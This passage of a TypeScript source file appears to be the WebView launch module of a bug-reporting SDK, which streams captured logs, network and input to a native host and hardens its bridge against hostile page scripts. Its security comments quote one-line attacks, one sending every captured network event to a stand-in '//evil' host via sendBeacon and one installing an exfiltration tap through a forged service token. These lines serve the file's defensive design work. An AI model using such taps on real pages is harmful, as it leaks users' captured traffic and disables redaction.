import {
  createBrowserInputSource,
  createBrowserSystemEventsSource,
  createBrowserSystemTracesSampler,
  createUnhandledRejectionProvider,
  createWindowErrorProvider,
  parseStack,
  type WindowEvents,
} from '@bugsee/browser';
import {
  createConsoleInterceptor,
  createInputProvider,
  createLogCaptureProvider,
  createSystemEventsProvider,
  createSystemTracesProvider,
  installNetworkCapture,
  type TraceSample,
} from '@bugsee/capture';
import {
  type BreadcrumbFilter,
  type BugseeClient,
  type CaptureStore,
  type Clock,
  COMMON_OPTION_DEFINITIONS,
  createClient,
  createServiceContainer,
  type FilterStore,
  FiltersToken,
  getCarrierClient,
  getOrCreateInterceptor,
  getServiceManifests,
  type LogEventFilter,
  type NetworkEventFilter,
  neverThrow,
  type ReportHandler,
  resolveLaunchOptions,
  type Scheduler,
  setCarrierClient,
} from '@bugsee/core';
import { BugseeOption } from '@bugsee/protocol';
import { randomId } from '@bugsee/util';
import { mintControlToken } from './control-token';
import { createHostBridge, type HostBridgeTransport } from './host-bridge';
import { createHostBridgeCaptureStore } from './host-bridge-capture-store';
import { createBridgeControl } from './host-bridge-control';
import { createObscuringChannel, type ObscuringChannel } from './obscuring-channel';
import {
  type ComposerDocument,
  type ComposerWindow,
  createObscuringComposer,
} from './obscuring-composer';
import { byeMessage, encode, helloMessage } from './protocol';
import { createRedactionProvenance } from './redaction-provenance';
import { createWebViewReportPipeline } from './webview-report-pipeline';

// @bugsee/webview launch() — the WebView composition root (docs/design/webview-bridge.md §5/§10). A WebView is a
// browser environment whose OUTPUT SINK is the native host, not the network: this reuses @bugsee/browser-family
// capture (console→log + network in slice 1; full parity in slice 2) over a HostBridgeCaptureStore that STREAMS
// each entry across the WebView boundary — NO transport / upload pipeline / bundle store / IndexedDB (native is
// the ring buffer + the bundler). On launch it opens a `hello` handshake (declaring its capabilities, which
// are recorded nowhere by native and decide nothing — D-A7) and exposes `__bugsee_bridge.control` for control.
// WebView-originated report TRIGGERING is gated behind `reportTrigger` (D5, default off) — wired in slice 2.

/** The SDK version reported in the handshake (default) + published on the injectable `BugseeWebView` global. */
export const SDK_VERSION = '0.1.0';

/**
 * The launched client, held HERE rather than on the process-global carrier.
 *
 * In a WebView the page is not the app — native is. The carrier lives at `window.__BUGSEE__`, an ordinary
 * writable property, so anything stored there is reachable by any page script, third-party tag or XSS:
 *
 *   const c = Object.values(window.__BUGSEE__)[0].client;
 *   c.setNetworkEventFilter(e => { navigator.sendBeacon('//evil', JSON.stringify(e)); return e; });
 *
 * A network filter is invoked with every event, body included, and REPLACES the default sanitizer — so
 * that one line is a capture tap that also switches off default redaction. `setLogEventFilter(() => null)`
 * suppresses, and `stop()` kills. None of it needs a sink to shadow, a race to win, or the D-A10 secret:
 * it walks around every defence the bridge has.
 *
 * That exposure is correct for @bugsee/browser, where the page IS the app and the client is its own API.
 * It is wrong here. So the carrier gets a resolver-only facade (below) and the mutation-capable client
 * stays in this module's scope, reachable only through the value `launch()` returns — which native's
 * bootstrap holds in a closure the page never sees.
 */
let launchedClient: Bugsee | undefined;

// The capture FileTypes this SDK emits — declared in the hello. Native records them nowhere and they decide
// nothing (D-A7): a claim arriving from the page must never reduce masking. The `obscuring`
// capability is added DYNAMICALLY (only when the obscuring channel is active — a DOM is present + not opted out)
// so native knows whether this SDK contributes a masking source at all — rects it ADDS to its own mask, never
// a reason to stand that mask down. The DOM viewtree + performance streams land in later slices.
const CAPABILITIES = [
  'log',
  'network',
  'traces.system',
  'events.system',
  'events.user',
  'input',
  'crash',
] as const;

export interface BugseeWebViewLaunchOptions {
  /** SDK version reported in the handshake. Default the package version. */
  sdkVersion?: string;

  /** Capture console output as logs. Default true. */
  captureLogs?: boolean;
  /** Capture network (fetch/xhr/ws/sse). Default true. */
  captureNetwork?: boolean;
  /** Capture request/response bodies (bounded read). Default true. */
  captureNetworkBodies?: boolean;
  /** Max captured request/response body size in bytes. Default 20480. */
  maxNetworkBodySize?: number;
  /**
   * Stream the viewport rects of sensitive elements (password / payment inputs + `.bugsee-hide`) so native masks
   * them in its captured frames. Default true. When on, the SDK declares the `obscuring` capability and streams
   * rects native ADDS to its own mask (D-A7 — native never stands its masking down for a page-supplied claim).
   *
   * Turning it off does NOT fall back to legacy masking: on the advanced path the legacy in-page script is not
   * injected, so opting out leaves this SDK contributing no rects at all.
   */
  captureObscuring?: boolean;

  /**
   * Allow the WebView to emit report TRIGGERS — an uncaught error / `logException` OPENING a native bug. D5:
   * default OFF. Native is the authority on opening bugs; the incident ALWAYS streams up as a `crash` timeline
   * entry regardless, so the web error enriches whatever report native opens. Native may also toggle this via
   * the handshake config.
   */
  reportTrigger?: boolean;

  // Redaction filters (D3) — optional JS-side scrubbing. By default the FilterStore is empty, content streams
  // un-redacted (`red:false`) and native applies its canonical filters; setting any of these runs it in JS
  // before crossing (the crossing is stamped `red:true`) AND native re-applies, so the union is enforced.
  /** Per-network-event filter: mutate the event, or return null to DROP it. */
  networkFilter?: NetworkEventFilter;
  /** Per-log-event filter: mutate, or return null to DROP. */
  logFilter?: LogEventFilter;
  /** Per-breadcrumb filter: mutate, or return null to DROP. */
  breadcrumbFilter?: BreadcrumbFilter;
  /** Report handler: `before` mutates/returns a new report or null to VETO it. */
  reportHandler?: ReportHandler;

  /**
   * A secret minted by NATIVE and passed in through the injected bootstrap (D-A10).
   *
   * Native chooses the bytes of the bundle it injects and, via document-start, runs them before any page
   * script — the one asymmetry native holds over the page. A nonce carried that way is a secret the page
   * never sees, which the JS-minted control token can never be: `launch` is itself reachable from the page,
   * so anything minted here a page script can mint too.
   *
   * When set, the control channel is closed from the FIRST message and this value is NOT published in
   * `hello` — native already has it, and putting it on the wire would hand it to whatever sink is listening.
   */
  controlNonce?: string;

  /**
   * A second native-minted secret, stamped on every OUTGOING message so native can drop capture it did not
   * send (D-A11). Also arrives through the injected bootstrap.
   *
   * Separate from {@link controlNonce} on purpose. This one has to travel the wire to do its job, so a page
   * script that shadowed `BugseeBridge` before the sink was pinned will read it — and that is survivable,
   * because such a script can already forge capture today. Sharing one secret across both directions would
   * mean the same exposure also granted `cmd:"stop"`, upgrading a capture tap into a capture kill switch.
   */
  captureNonce?: string;

  /**
   * Which native sink to use, declared by native in the bootstrap it interpolates into the injected
   * bundle (D-A11's out-of-band route).
   *
   * Native knows which handler it registered and the page does not. That asymmetry is the whole value:
   * each native populates one of the two interface names and leaves the other permanently VACANT — so a
   * vacant name is a page-writable slot, and probing for a sink hands the capture stream to a well-formed
   * plant there. On iOS that needs no race at all, since `window.BugseeBridge` is never occupied.
   *
   * Omitted → both are probed, which is what hosts predating this option do.
   */
  transport?: HostBridgeTransport;

  /** Internal-error sink (provider-start / bridge-post failures). Default no-op. */
  onError?: (error: unknown) => void;

  // Injectable seams (advanced / tests) — defaults target the real WebView runtime.
  /** The WebView global hosting the native bridge + the `__bugsee_bridge` control entry. Default `globalThis`. */
  global?: object;
  /** Window event target for system events (pagehide…). Default the global `window`. */
  window?: WindowEvents;
  /** DOM document for user-input capture (clicks/keys/…). Default `window.document`. */
  document?: Document;
  /** System-traces sampler (performance.memory…). Default the browser sampler. */
  systemMetricsSampler?: () => readonly TraceSample[];
  /** Time source. Default the system clock. */
  clock?: Clock;
  /** Scheduler for the capture-store tick. Default global timers. */
  scheduler?: Scheduler;
  /** Capture store override (advanced / tests). Default the streaming host-bridge store. */
  captureStore?: CaptureStore;
  /**
   * Carrier host for the per-WebView singleton + shared interceptors; injectable for tests. Default the global
   * carrier. TEST-ONLY: the core capture providers resolve redaction filters from the GLOBAL carrier, so a
   * non-global carrier is only consistent for the default. (Native re-redacts unconditionally regardless, so a
   * mismatched `red` provenance flag is never a privacy hazard — see redaction-provenance.ts.)
   */
  carrier?: object;
}

/** What `__bugsee_bridge` forwards to for the CURRENT session (swapped on launch/stop). */
interface BridgeSession {
  control(raw: string): void;
  snapshot(): string;
}

/** The stopped state. `snapshot()` must still answer `'[]'` rather than throw: native pulls it synchronously
 *  at frame-capture time, and an exception there propagates into `evaluateJavascript` — the fail-open shape
 *  fixed as SEV1-1. A stopped SDK legitimately has no rects. */
const INERT_SESSION: BridgeSession = {
  control: (): void => {},
  snapshot: (): string => '[]',
};

/**
 * Per-global state behind the immutable `__bugsee_bridge` binding.
 *
 * `session` is re-pointed across launches. `installed` records whether the binding is actually OURS — a
 * page script that pre-owns the name makes `defineProperty` throw, and the SDK must then fail closed
 * rather than advertise a control surface it does not have. `auth` holds the one-way latch at GLOBAL
 * scope, not per-launch: `launch` is itself a page global, so a per-launch latch could be reset simply by
 * relaunching (review round 1).
 */
interface BridgeSlot {
  session: BridgeSession;
  installed: boolean;
  auth: { authenticated: boolean };
}

const BRIDGE_SLOTS = new WeakMap<object, BridgeSlot>();

/**
 * Install `__bugsee_bridge` on a CLOSED binding and return the slot its methods delegate to
 * (Wave 0.3 / D-A3, docs/design/webview-bridge-auth.md).
 *
 * `Object.freeze(obj)` — what this used to do — protects the object and leaves the binding
 * `{writable: true, configurable: true}`, so a page script could swap the whole thing: `snapshot()` then
 * returned `[]` while real secure areas existed, and native had already dropped its own masking script.
 * `writable: false, configurable: false` is what actually closes it.
 *
 * The cost is that teardown can no longer delete the property, so the object is permanent and the SESSION
 * behind it is what changes — inert after `stop()`, live again after a later `launch()`.
 */
function bridgeSlotFor(
  global: object,
  onError: ((error: unknown) => void) | undefined,
): BridgeSlot {
  const existing = BRIDGE_SLOTS.get(global);
  if (existing !== undefined) {
    return existing; // a previous launch already closed the binding on this global
  }
  const slot: BridgeSlot = {
    session: INERT_SESSION,
    installed: false,
    auth: { authenticated: false },
  };
  const api = Object.freeze({
    control: (raw: string): void => slot.session.control(raw),
    snapshot: (): string => slot.session.snapshot(),
  });
  try {
    Object.defineProperty(global, '__bugsee_bridge', {
      value: api,
      writable: false,
      configurable: false,
      enumerable: true,
    });
    slot.installed = true;
  } catch (error) {
    // Something already owns the name on a non-configurable binding — a hostile page that ran first, or a
    // host that pre-defined it. Nothing can be reclaimed here, so report and let the session run WITHOUT a
    // control entry rather than throwing out of launch(). `installed` stays false, and the caller uses it
    // to fail CLOSED — see the `obscuring` capability. `onError` is contained: it belongs to the host app
    // and must not take launch() down (capture may never alter app behaviour).
    neverThrow(() => onError?.(error), undefined);
  }
  // Cached either way, so a repeat launch does not retry a defineProperty that is guaranteed to throw and
  // re-report the same failure once per launch.
  BRIDGE_SLOTS.set(global, slot);
  return slot;
}

/** The launched WebView client — the public SDK surface. */
export type Bugsee = BugseeClient;

/** Launch the Bugsee WebView SDK. A per-WebView singleton (a repeat call is ignored). Returns the started client. */
export function launch(appToken: string, options: BugseeWebViewLaunchOptions = {}): Bugsee {
  const sdkVersion = options.sdkVersion ?? SDK_VERSION;
  const carrier = options.carrier;
  const global = (options.global ?? globalThis) as { __bugsee_bridge?: unknown };

  const bridgeSlot = bridgeSlotFor(global, options.onError);

  // The carrier holds the FACADE, so its presence is the "already launched" signal; the client to hand
  // back comes from module scope — RESTRICTED, because `launch` is a page global and a repeat call is
  // therefore a page-reachable request for the live client. See `restrictedClientFor`.
  if (getCarrierClient<unknown>(carrier) !== undefined) {
    options.onError?.(
      new Error(
        'Bugsee.launch() called more than once in this WebView; the repeat call is ignored',
      ),
    );
    // Never `undefined as Bugsee`: a second module copy that did not perform the launch would hand back
    // a value whose first method call is a TypeError. An inert client is diagnosable; a crash is not.
    return launchedClient !== undefined
      ? restrictedClientFor(launchedClient, options.onError)
      : inertClient(options.onError);
  }

  const resolved = resolveLaunchOptions(
    options as unknown as Record<string, unknown>,
    COMMON_OPTION_DEFINITIONS,
  );

  const services = createServiceContainer();

  // The JS→native channel + the streaming capture store: every captured entry is posted across the boundary
  // immediately (native is the ring + bundler). No transport / upload pipeline / bundle store / IndexedDB.
  const bridge = createHostBridge({
    global,
    // Stamped on every outgoing message so native can distinguish this SDK's capture from a page script's
    // (D-A11). A SEPARATE secret from `controlNonce`, deliberately: this one necessarily travels the wire,
    // so a script that shadowed `BugseeBridge` before we pinned it (the page-ready fallback) reads it. That
    // costs forged capture, which such a script could already produce. Reusing the control nonce here would
    // additionally hand it `cmd:"stop"` — turning a tap into a kill switch.
    ...(options.captureNonce !== undefined ? { nonce: options.captureNonce } : {}),
    ...(options.transport !== undefined ? { transport: options.transport } : {}),
    ...(options.onError !== undefined ? { onError: options.onError } : {}),
  });
  // One per-session monotonic sequence shared by the capture stream + the report path (so seq is global).
  let seqN = 0;
  const seq = (): number => seqN++;
  // Control state flipped by native commands (§7): `paused` drops the capture stream while backgrounded; flush
  // + stop delegate to `publicClient`, assigned at the end of launch — the onCommand closure reads it only when
  // native actually sends a command (always after launch returns). `snapshot` re-pushes the current secure-area
  // rects via the obscuring channel (assigned below; native usually PULLS them synchronously via
  // `__bugsee_bridge.snapshot()`, but the command path lets it request an async refresh).
  let paused = false;
  let publicClient: Bugsee;
  let obscuring: ObscuringChannel | undefined; // TOP frame: the native I/O channel
  // Set once the probe has run (below). Read by BOTH the start() path and the native snapshot command.
  let obscuringWorks = false;
  // The per-session control token (Wave 0.3 / D-A1). Minted from a CSPRNG — NOT `randomId()`, whose
  // fallback is `Math.random()` and which documents itself as unsuitable for secrets (see control-token.ts).
  // `undefined` when the runtime has no CSPRNG: the channel then stays unauthenticated, which is the
  // documented pre-upgrade state and strictly better than a token the page can predict.
  //
  // Read `bridge.available` HERE, before anything is posted, and use the one answer for both the published
  // hello and the enforcing side. Deciding twice would risk the two disagreeing — enforcing a token the
  // handshake never published locks native out permanently.
  // `mintControlToken()` reads `globalThis`, NOT the injected `global`: that option is a seam for the
  // bridge SURFACE (`BugseeBridge` / `__bugsee_bridge`), not a realm, and the CSPRNG must come from the
  // realm actually executing this code.
  //
  // A NATIVE-minted nonce supersedes all of that when present (D-A10). Native interpolates it into the
  // bundle it injects, so it reaches this SDK by a route the page never observes, and native knew it before
  // the first message — no publication in `hello`, no open period, no latch to arm. The JS-minted token
  // remains for hosts that pass no nonce.
  const nativeSecret = options.controlNonce;
  const controlToken =
    nativeSecret === undefined && bridge.available ? mintControlToken() : undefined;
  const control = createBridgeControl({
    token: controlToken,
    ...(nativeSecret !== undefined ? { nativeSecret } : {}),
    // The latch lives on the per-global slot, not in this closure, so a page-forced relaunch inherits it.
    auth: bridgeSlot.auth,
    onError: options.onError,
    reportTrigger: options.reportTrigger ?? false,
    onCommand: (command) => {
      if (command === 'pause') {
        paused = true;
      } else if (command === 'resume') {
        paused = false;
      } else if (command === 'flush') {
        // native calls flush before capturing a frame / opening a report so the timeline is current; it awaits
        // the client's pending work (and will additionally drain the capture batch once batching lands).
        void publicClient.flush();
      } else if (command === 'stop') {
        void publicClient.stop();
      } else if (command === 'snapshot' && obscuringWorks) {
        // Gated on the same probe as `start()`. Ungated, native asking for a frame got a `secure` message
        // it had never negotiated — on the page whose collection was just declared broken. "Silent on the
        // wire" has to cover every path that reaches the wire, not the one the fix was looking at.
        obscuring?.emit();
      }
      // unknown → ignored.
    },
  });
  // D3 redaction provenance: read the live `filters` service (registered by createClient into `services` below,
  // mutated by the JS-side filter options + the returned client's set* methods) to stamp each crossing's `red`
  // flag — per entry type for the stream, per report handler for incidents. Lazy: the store/pipeline are built
  // before the service is registered, and a filter may be set after launch.
  const provenance = createRedactionProvenance((): FilterStore | null =>
    services.getProvider(FiltersToken).getImmediate({ optional: true }),
  );
  const captureStore =
    options.captureStore ??
    createHostBridgeCaptureStore({
      bridge,
      seq,
      paused: () => paused,
      redactedFor: provenance.forEntry,
    });
  // The report path replaces bundle-assembly+upload (D2): every detected incident / logException streams up as
  // a `crash` entry (always, D5), plus a report TRIGGER gated on `reportTrigger` (read dynamically).
  const triggerPipeline = createWebViewReportPipeline({
    bridge,
    reportTriggerEnabled: () => control.config.reportTrigger,
    seq,
    redacted: provenance.forReport,
  });

  const client = createClient({
    isEnabled: resolved.isEnabled,
    launchOptions: resolved.options,
    services,
    captureStore,
    triggerPipeline,
    appToken,
    ...(options.clock !== undefined ? { clock: options.clock } : {}),
    ...(options.scheduler !== undefined ? { scheduler: options.scheduler } : {}),
    ...(options.onError !== undefined ? { onError: options.onError } : {}),
  });

  // Install any JS-side redaction filters (D3) into the `filters` service via the facade. The capture providers
  // + the report path then run them before crossing; the provenance above stamps `red` accordingly.
  if (options.networkFilter !== undefined) {
    client.setNetworkEventFilter(options.networkFilter);
  }
  if (options.logFilter !== undefined) {
    client.setLogEventFilter(options.logFilter);
  }
  if (options.breadcrumbFilter !== undefined) {
    client.setBreadcrumbFilter(options.breadcrumbFilter);
  }
  if (options.reportHandler !== undefined) {
    client.setReportHandler(options.reportHandler);
  }

  for (const manifest of getServiceManifests(carrier)) {
    manifest(client);
  }

  // Capture providers: console→log; network umbrella (fetch/xhr/ws/sse); system traces (performance.memory);
  // system events (process_started + pagehide); user input (clicks/keys → the SDK-captured `input` stream,
  // never events.user — that stream is reserved for application-supplied client.event() data). Each carrier-shared
  // interceptor self-skips when its controllingOption is off. (The DOM viewtree + obscuring + error/crash +
  // performance streams land in later slices.)
  const win = options.window ?? (globalThis as { window?: WindowEvents }).window;
  const domDocument = options.document ?? (globalThis as { document?: Document }).document;

  // === SUB-FRAME: obscuring only, and nothing else =============================================
  //
  // A WebView has ONE Bugsee session, owned by the top frame. A sub-frame that is injected (D9) exists to
  // contribute its secure-area rects to the top frame's composed union — that is the whole job.
  //
  // Everything below this branch is deliberately skipped in a sub-frame:
  //  - `hello`: the protocol is one handshake per WebView. N frames posting N hellos makes the session id,
  //    N sessions' worth of handshakes for one WebView. (The sharper version — whichever frame's hello decided
  //    the retained token and the obscuring capability — is gone: native retains nothing, D-A10, and `caps`
  //    decides nothing, D-A7.)
  //  - the control token: a sub-frame can never RECEIVE control — `evaluateJavascript` targets the top
  //    frame — so a token minted here is unusable, and if native retained it the TOP frame's own control
  //    would be rejected as a mismatch.
  //  - capture: each frame keeps its own `seq` from 0, so entries from different frames collide in
  //    ordering. And D9 exists to keep Bugsee OUT of third-party content (webview-bridge.md:66) — running
  //    a full capture stack inside every ad/OAuth/payment iframe is the opposite of that.
  //  - `client.launch()`: `isLaunched()` stays false, which is truthful. This frame captures nothing.
  //
  // The client is still constructed and returned so the public signature holds and the host's `stop()`
  // works; it simply never starts.
  const w = win as { top?: unknown; self?: unknown } | undefined;
  const isTopFrame = w?.top === undefined || w.top === (w.self ?? w);
  // `win !== undefined` is not a redundant guard: it is what tells the type system that a sub-frame always
  // HAS a window. `isTopFrame` is derived from `win`, so `!isTopFrame` already implies it is defined —
  // spelling it here keeps the composer's `window` unconditional instead of leaving an unreachable branch.
  if (win !== undefined && !isTopFrame) {
    if ((options.captureObscuring ?? true) && domDocument !== undefined) {
      const childComposer = createObscuringComposer({
        document: domDocument as unknown as ComposerDocument,
        window: win as unknown as ComposerWindow,
        ...(options.onError !== undefined ? { onError: options.onError } : {}),
        isTopFrame: false,
      });
      // The composer is called directly here, so its failures would escape launch() — and `window.parent`
      // is [Replaceable], so one line of page script is enough to make it throw.
      neverThrow(() => childComposer.start(), options.onError);
      publicClient = {
        ...client,
        stop(timeout?: number): Promise<boolean> {
          neverThrow(() => childComposer.stop(), options.onError);
          return client.stop(timeout);
        },
      };
    } else {
      publicClient = client;
    }
    launchedClient = publicClient;
    setCarrierClient(carrierFacadeFor(publicClient), carrier);
    return publicClient;
  }

  const consoleInterceptor = getOrCreateInterceptor(
    'console',
    // A WebView IS a real browser engine — WKWebView is JavaScriptCore, Android WebView is V8 — so this
    // tier spans both stack dialects and needs the dispatching parser. Core's V8-only default yields
    // zero frames for JavaScriptCore's `fn@loc` stacks, silently dropping `console.trace()`'s stack on
    // every iOS WebView.
    () => createConsoleInterceptor({ stackParser: parseStack }),
    carrier,
  );
  client.addCaptureProvider(createLogCaptureProvider(consoleInterceptor));
  const captureBodies = resolved.options.get(BugseeOption.CaptureNetworkBodies, true);
  const maxBodyBytes = resolved.options.get(BugseeOption.CaptureNetworkBodySizeLimit, 20480);
  const network = installNetworkCapture({ carrier, captureBodies, maxBodyBytes });
  client.addCaptureProvider(network.provider);
  client.addCaptureProvider(
    createSystemTracesProvider({
      sample: options.systemMetricsSampler ?? createBrowserSystemTracesSampler(),
      ...(options.scheduler !== undefined ? { scheduler: options.scheduler } : {}),
    }),
  );
  if (win !== undefined) {
    client.addCaptureProvider(
      createSystemEventsProvider(
        createBrowserSystemEventsSource({
          window: win,
          ...(domDocument !== undefined ? { document: domDocument } : {}),
        }),
      ),
    );
  }
  // Input capture: one carrier-shared DOM source (capture-phase, passive, observe-only) → the dedicated
  // `input` stream. NOT `events.user`: that stream carries the embedded app's own `client.event()` data,
  // and SDK code must never write into a `user.*` stream.
  const inputSource = getOrCreateInterceptor(
    'webview-input',
    () => createBrowserInputSource({ target: domDocument }),
    carrier,
  );
  client.addCaptureProvider(createInputProvider(inputSource));

  // Detection: window `error` → crash, `unhandledrejection` → error, on the WebView window. The report path
  // (triggerPipeline above) ALWAYS streams the incident as a `crash` entry; whether it ALSO opens a native bug
  // is gated by `reportTrigger` (D5, default off). Skipped if there is no window.
  if (win !== undefined) {
    client.addDetectionProvider(createWindowErrorProvider(win));
    client.addDetectionProvider(createUnhandledRejectionProvider(win));
  }

  // Obscuring (D9): when there is a DOM and it isn't opted out, track the secure-area rects so native masks
  // sensitive pixels. Obscuring runs in EVERY injected frame, but the frame's role differs (sub-frame rect
  // COMPOSITION — the legacy VIEWS_BUBBLE port):
  //   - the TOP frame owns the native I/O (the channel): it composes its own rects + the rects bubbled up from
  //     sub-frames into DOCUMENT-ABSOLUTE coordinates, posts the union as `secure`, and declares the `obscuring`
  //     capability, which native adds to its own mask rather than standing that mask down (D-A7);
  //   - a SUB-frame runs a composer that `postMessage`s its (composed) viewport rects to its parent — handled
  //     by the sub-frame branch above, which returns before reaching here.
  // (Native never drops its own masking for this — D-A7. The union is what makes the whole path monotone.)
  if ((options.captureObscuring ?? true) && domDocument !== undefined) {
    obscuring = createObscuringChannel({
      bridge,
      document: domDocument as unknown as ComposerDocument,
      ...(win !== undefined ? { window: win as unknown as ComposerWindow } : {}),
      ...(options.onError !== undefined ? { onError: options.onError } : {}),
      seq,
    });
  }
  // Only the TOP frame declares `obscuring` (it alone reports the composed whole-page union to native), and
  // only once a collection has been PROVEN to work. The claim cannot be retracted — the protocol has no
  // retraction message — so on a page where
  // collection already throws, staying silent leaves native's own masking in place, which is the fail-closed
  // answer (docs/review/webview.md SEV1 #2).
  //
  // The probe result gates the CHANNEL as well as the capability. Declaring nothing but starting anyway
  // still put `secure` frames on the wire — messages native never negotiated, on the exact page whose
  // collection was just proven broken. "Staying silent" has to mean silent on the wire, not merely absent
  // from `caps`.
  // Fail CLOSED on both counts (review round 1). The probe already covered "collection is broken"; the
  // second half is that a control surface we do not own is just as disqualifying. Declaring `obscuring` tells
  // native this SDK supplies rects; advertising it while the page owns `__bugsee_bridge` means the rects it
  // expects never arrive, and on the advanced path there is no other in-WebView mask source — so the pixels
  // are masked by nobody, which is worse than not declaring at all.
  obscuringWorks = obscuring?.probe() === true && bridgeSlot.installed;
  const caps = obscuringWorks ? [...CAPABILITIES, 'obscuring'] : [...CAPABILITIES];

  // The native→JS control entry point: native calls `__bugsee_bridge.control(json)` via evaluateJavascript for
  // the handshake reply + commands; it also PULLS the current secure-area rects synchronously at frame-capture
  // time via `__bugsee_bridge.snapshot()` (serialized rects; `[]` when obscuring is off).
  // The binding itself is immutable (D-A3); what a launch swaps is the SESSION behind it.
  const mySession: BridgeSession = {
    control: control.control,
    snapshot: (): string => obscuring?.snapshot() ?? '[]',
  };
  bridgeSlot.session = mySession;

  // Open the handshake BEFORE capture starts so it is the first thing native sees. Declaring `caps` is what
  // is recorded nowhere by native and decides nothing (D-A7).
  //
  // The token rides this message ONLY when a native sink is already attached (review round 1, SEV1). When
  // it is not, `hello` goes into the host bridge's backlog and is delivered to whichever sink turns up
  // later — and a page script can be that sink, which is precisely the tap this whole wave exists to stop.
  // Handing it the token would be worse than sending none: it could then authenticate, arm the one-way
  // latch, and lock the real native receiver out of its own channel.
  //
  // Withholding costs an unauthenticated session in the late-attach case, which is the pre-upgrade state
  // the design already accepts. It is NOT the common case: native adds the interface before the page
  // loads, so by `hello` the sink is normally there.
  bridge.post(
    encode(helloMessage({ sdk: sdkVersion, caps, session: randomId(), token: controlToken })),
  );

  client.launch();
  // Begin secure-area tracking once the SDK is live (top frame posts to native; a sub-frame bubbles to parent).
  // Only when the probe proved collection works — see `obscuringWorks` above.
  if (obscuringWorks) {
    obscuring?.start();
  }

  // The public client. stop() clears the per-WebView carrier slot and makes the control global INERT — the
  // binding is non-configurable and cannot be removed (D-A3), so a later launch() re-points the session
  // behind it rather than starting from a fresh binding.
  const stopCore = client.stop;
  publicClient = {
    ...client,
    stop(timeout?: number): Promise<boolean> {
      obscuring?.stop(); // detach the secure-area observers/listeners
      bridge.post(encode(byeMessage())); // signal teardown so native can finalize this WebView's stream
      setCarrierClient(undefined, carrier);
      launchedClient = undefined;
      // The binding cannot be removed (D-A3) — the session behind it goes inert instead, so a page script
      // cannot drive a stopped SDK and a later launch() can re-point the same binding at a live session.
      // Only revert if this session is still the CURRENT one (review round 1). The slot is shared per
      // global, so a late/duplicate stop() from a stale handle would otherwise make a NEWER live session
      // inert — control and the frame-time snapshot dead while capture keeps flowing.
      if (bridgeSlot.session === mySession) {
        bridgeSlot.session = INERT_SESSION;
      }
      return stopCore(timeout);
    },
  };
  launchedClient = publicClient;
  setCarrierClient(carrierFacadeFor(publicClient), carrier);
  return publicClient;
}

/**
 * What a REPEAT `launch()` hands back.
 *
 * `launch` is a page global — the IIFE publishes it as `BugseeWebView.launch`, and native injects that
 * bundle into the page world. So `BugseeWebView.launch('anything')` is a one-line way for page script to
 * ask for the live client, and returning the real one handed over `setNetworkEventFilter` (a capture tap
 * that also disables the default sanitizer), `stop()`, and the DI container. Moving the client off the
 * page-reachable carrier achieved nothing while this door stayed open.
 *
 * The split is by what the page can ALREADY do. It can generate captured content — a `console.log` is
 * captured, a `fetch` is captured — so `log`/`event`/`trace`/`addBreadcrumb`/`logException` stay live and
 * grant nothing new. What it must not gain is control over REDACTION (the filters, the report handler),
 * over the session's LIFETIME (`stop`/`flush`), or over the container (`getService`, `addService`,
 * `registerExt`) — none of which it can reach by any other route.
 *
 * Neutralised rather than removed, so the value still satisfies the declared type and an embedder who
 * genuinely double-launched gets a working object rather than a TypeError. Each blocked call reports
 * through `onError`, so a real double-launch is diagnosable.
 */
function restrictedClientFor(client: Bugsee, onError?: (error: unknown) => void): Bugsee {
  const refuse = (method: string): void => {
    neverThrow(
      () =>
        onError?.(
          new Error(
            `Bugsee: \`${method}\` is not available on a repeat launch() in a WebView; the original ` +
              'client holds it. This call was ignored.',
          ),
        ),
      undefined,
    );
  };
  const blocked = {
    setNetworkEventFilter: (): void => refuse('setNetworkEventFilter'),
    setLogEventFilter: (): void => refuse('setLogEventFilter'),
    setBreadcrumbFilter: (): void => refuse('setBreadcrumbFilter'),
    setReportHandler: (): void => refuse('setReportHandler'),
    stop: async (): Promise<boolean> => {
      refuse('stop');
      return false;
    },
    flush: async (): Promise<boolean> => {
      refuse('flush');
      return false;
    },
    getService: (): never => {
      refuse('getService');
      throw new Error('Bugsee: getService is not available on a repeat launch()');
    },
    getServiceProvider: (): never => {
      refuse('getServiceProvider');
      throw new Error('Bugsee: getServiceProvider is not available on a repeat launch()');
    },
    addService: (): void => refuse('addService'),
    registerExt: (): void => refuse('registerExt'),
  };
  return { ...client, ...blocked } as unknown as Bugsee;
}

/** A repeat launch from a module copy that did not perform it: inert, but never `undefined`. */
function inertClient(onError?: (error: unknown) => void): Bugsee {
  neverThrow(
    () =>
      onError?.(
        new Error(
          'Bugsee: launch() was already called from another module copy; this call returns an inert client.',
        ),
      ),
    undefined,
  );
  const noop = (): void => {};
  return {
    isLaunched: (): boolean => true,
    launch: noop,
    stop: async (): Promise<boolean> => false,
    flush: async (): Promise<boolean> => false,
    log: noop,
    event: noop,
    trace: noop,
    addBreadcrumb: noop,
    setUserIdentifier: noop,
    getUserIdentifier: (): string | null => null,
    clearUserIdentifier: noop,
    setAttribute: noop,
    getAttribute: (): undefined => undefined,
    clearAttribute: noop,
    clearAllAttributes: noop,
    getAllAttributes: (): Record<string, never> => ({}),
    setNetworkEventFilter: noop,
    setLogEventFilter: noop,
    setBreadcrumbFilter: noop,
    setReportHandler: noop,
  } as unknown as Bugsee;
}

/**
 * What the process global is allowed to hold: the service resolver, and nothing else.
 *
 * The capture pipeline reaches redaction filters through `getFilters()` → `getInternal()` →
 * `getService(FiltersToken)`, so `getService`/`getServiceProvider` is the entire internal requirement.
 * Everything else on the client — `setNetworkEventFilter`, `setLogEventFilter`, `stop`, `logException` —
 * exists for the embedder and has no business being reachable from page script.
 *
 * "Resolver-only" is NOT by itself a defence, and an earlier version of this comment wrongly said it was
 * ("reading a service is not a meaningful capability"). Reading IS the capability: the container keys
 * providers on `token.name`, a plain string, and the FilterStore it hands back is the same unfrozen object
 * `setNetworkEventFilter` writes — so a forged `{name:'filters'}` reaches `filters.network = …`, which is
 * the capture tap AND the default-sanitizer bypass in one property write.
 *
 * What actually closes it is resolving by token IDENTITY (below): a page can forge the shape of a token
 * but not the identity of an object only this module holds.
 */
function carrierFacadeFor(client: Bugsee): { getService: unknown; getServiceProvider: unknown } {
  const resolver = client as unknown as {
    getService: (token: unknown) => unknown;
    getServiceProvider: (token: unknown) => unknown;
  };
  // IDENTITY, not name. The container keys providers by `token.name`, a plain string, so forwarding an
  // arbitrary token let page script write its own:
  //
  //   facade.getService({ name: 'filters' }).network = e => { exfiltrate(e); return e; }
  //
  // and land on the very same FilterStore object `setNetworkEventFilter` mutates — the capture tap and
